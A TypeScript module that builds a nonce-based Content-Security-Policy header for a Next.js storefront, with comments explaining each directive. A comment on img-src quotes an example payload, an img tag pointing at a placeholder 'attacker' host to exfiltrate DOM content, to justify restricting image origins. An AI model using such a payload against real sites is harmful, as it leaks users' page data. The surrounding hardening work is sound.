/**
 * Content-Security-Policy, built per request so production can carry a nonce.
 *
 * The previous policy shipped `script-src 'unsafe-inline'`, which is most of
 * what CSP buys you against XSS: an injected inline `<script>` just runs. A
 * nonce is the only way to keep inline scripts working without that, because
 * Next's hydration bootstrap is inline by construction.
 *
 * `'strict-dynamic'` lets the nonced bootstrap load the chunk graph without
 * every chunk URL needing its own allowlist entry. CSP3 browsers ignore `'self'`
 * once it is present; it stays as the fallback for older ones.
 */
/**
 * The R2 public bucket's origin, or null when none is configured.
 *
 * `new URL(...).origin` is what makes this safe to interpolate: it yields scheme
 * plus host plus port and drops any path or trailing slash, so a mis-set env var
 * cannot widen the policy into something else. Read per call rather than at
 * module load so the value is whatever the running process has.
 */
function cdnOrigin(): string | null {
  const raw = process.env.NEXT_PUBLIC_CDN_URL?.trim()
  if (!raw) return null
  try {
    const url = new URL(raw)
    return url.protocol === 'https:' || url.protocol === 'http:' ? url.origin : null
  } catch {
    return null
  }
}

export function contentSecurityPolicy(nonce: string | null): string {
  // Dev needs 'unsafe-eval' for React Refresh and 'unsafe-inline' for the HMR
  // client, neither of which is nonced. Prod is the policy that matters.
  const scriptSrc = nonce
    ? `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`
    : "script-src 'self' 'unsafe-inline' 'unsafe-eval'"

  return [
    "default-src 'self'",
    scriptSrc,
    // Inline styles stay allowed: Tailwind's runtime and framer-motion both set
    // style attributes directly, and a style-src injection cannot execute code.
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    // Scoped to the CDN rather than the whole of `https:`. An `img-src` cannot
    // execute code, but a wildcard leaves a working GET-based exfiltration
    // channel for any injection that does land: `<img src="https://attacker/?d=">`
    // sends whatever is in the DOM. Product photos and payment QR come from the
    // R2 public bucket; slips come from our own authed route ('self'), the
    // no-photo placeholder is a `data:` pixel, and admin upload previews are
    // `blob:`. Nothing legitimately needs a third-party origin.
    ['img-src', "'self'", 'data:', 'blob:', cdnOrigin()].filter(Boolean).join(' '),
    "font-src 'self' data: https://fonts.gstatic.com",
    "connect-src 'self'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "object-src 'none'",
  ].join('; ')
}

/** Per-request nonce. Base64 so it survives the header round-trip verbatim. */
export function generateNonce(): string {
  return btoa(crypto.randomUUID())
}
